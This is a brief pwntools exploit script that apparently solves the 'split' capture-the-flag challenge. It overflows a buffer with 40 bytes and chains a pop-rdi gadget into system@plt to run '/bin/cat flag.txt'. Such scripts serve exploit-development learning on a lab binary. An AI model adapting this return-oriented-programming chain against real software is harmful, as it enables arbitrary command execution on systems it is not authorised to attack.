from pwn import *
target=process('./split')

payload="A"*40

#address of "/bin/cat flag.txt"
string=0x601060

poprdi=0x400883
system_plt=0x4005e0

payload+=p64(poprdi)
payload+=p64(string)
payload+=p64(system_plt)

target.sendline(payload)
target.interactive()

